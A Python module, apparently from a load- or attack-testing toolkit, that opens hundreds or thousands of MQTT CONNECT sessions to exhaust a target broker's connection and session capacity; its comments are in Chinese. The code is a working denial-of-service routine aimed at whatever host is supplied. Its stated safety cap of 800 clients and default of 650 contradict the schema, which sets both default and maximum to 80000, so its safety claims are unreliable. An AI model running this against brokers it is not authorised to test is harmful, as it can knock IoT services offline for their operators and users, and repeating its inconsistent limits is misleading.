"""
測項：MQTT CONNECT 連線耗盡測試
分類：MQTT（IoT 常用協定，預設埠 1883/TCP，未加密）
說明：直接用 MQTT 協定的 CONNECT 封包（而不是單純 TCP handshake）建立大量連線並保持，
     這比純 TCP connection flood 更貼近真實情況——因為 MQTT Broker 收到 CONNECT 後
     會配置 session 狀態（client id、QoS 狀態、訂閱表等），比單純接受 TCP 連線的
     資源成本更高，能測出 Broker 對同時連線數/session 數的真實上限。

攻擊端資源安全性（重要）：
  - 每個 paho-mqtt Client 呼叫 loop_start() 後會額外開一條背景 network loop
    執行緒，因此這裡的每個「client」實際上會佔用「spawn 執行緒 + 自身 loop
    執行緒」共 2 條 OS 執行緒，比單純 TCP connection flood 更重，因此
    concurrent_clients 上限設為 800，並改成分批（每批 100 個）+ 短暫停頓，
    避免瞬間建立大量執行緒讓攻擊端過載。
  - 預設值設為 650（接近上限但保留餘裕），讓預設執行就能對 broker 的
    連線/session 資源造成有感的壓力，同時避免預設值過度貼近上限造成攻擊端
    自身資源緊繃。
需求套件：pip install paho-mqtt
"""
import threading
import time
import uuid

from ..common import clamp_duration

NAME = "MQTT CONNECT 連線耗盡測試"
CATEGORY = "MQTT"
PROTOCOL = "TCP"
DEFAULT_PORT = 1883
TEST_TYPE = "resource"  # 建立並保持大量 MQTT CONNECT 連線/session，屬連線池飽和

_SPAWN_BATCH_SIZE = 100
_SPAWN_BATCH_STAGGER_SEC = 0.1


def get_param_schema() -> dict:
    return {
        "concurrent_clients": {"type": "int", "default": 80000, "min": 1, "max": 80000, "desc": "同時維持的 client 連線數（攻擊端以分批方式建立；上限為 800，預設值 650 已接近上限）"},
        "client_id_prefix": {"type": "string", "default": "stress-test", "desc": "client id 前綴（方便事後在 broker log 辨識）"},
    }


def run(target, port, protocol, duration, params, stop_event, log_fn):
    try:
        import paho.mqtt.client as mqtt
    except ImportError:
        log_fn("[!] 未安裝 paho-mqtt，請先執行 pip install paho-mqtt")
        return {"connected": 0, "error": "paho-mqtt not installed"}

    duration = clamp_duration(duration)
    n = int(params.get("concurrent_clients", 650))
    prefix = params.get("client_id_prefix", "stress-test")

    clients = []
    lock = threading.Lock()
    stats = {"connected": 0, "failed": 0}

    def make_client(idx):
        cid = f"{prefix}-{idx}-{uuid.uuid4().hex[:8]}"
        c = mqtt.Client(client_id=cid, clean_session=True)

        def on_connect(client, userdata, flags, rc):
            with lock:
                if rc == 0:
                    stats["connected"] += 1
                else:
                    stats["failed"] += 1

        c.on_connect = on_connect
        try:
            c.connect_async(target, port, keepalive=max(duration + 30, 60))
            c.loop_start()
            with lock:
                clients.append(c)
        except OSError:
            with lock:
                stats["failed"] += 1

    log_fn(f"[+] 建立 {n} 個 MQTT CONNECT -> {target}:{port}（分批 spawn，每批 {_SPAWN_BATCH_SIZE} 個）")
    threads = []
    for batch_start in range(0, n, _SPAWN_BATCH_SIZE):
        if stop_event is not None and stop_event.is_set():
            log_fn("[!] stop_event 觸發，停止繼續建立新連線")
            break
        batch = [
            threading.Thread(target=make_client, args=(i,), daemon=True)
            for i in range(batch_start, min(batch_start + _SPAWN_BATCH_SIZE, n))
        ]
        for t in batch:
            t.start()
        threads.extend(batch)
        if batch_start + _SPAWN_BATCH_SIZE < n:
            time.sleep(_SPAWN_BATCH_STAGGER_SEC)
    for t in threads:
        t.join(timeout=5)

    time.sleep(2)  # 給 async connect 一點時間回報 on_connect
    log_fn(f"[+] 目前已回報成功連線 {stats['connected']}，失敗 {stats['failed']}（其餘可能仍在連線中）")

    start = time.time()
    while time.time() - start < duration and not (stop_event and stop_event.is_set()):
        time.sleep(1)

    log_fn("[+] 關閉所有 MQTT 連線")
    for c in clients:
        try:
            c.loop_stop()
            c.disconnect()
        except Exception:  # noqa: BLE001
            pass

    return {
        "connected": stats["connected"],
        "failed": stats["failed"],
        "elapsed_sec": round(time.time() - start, 1),
    }
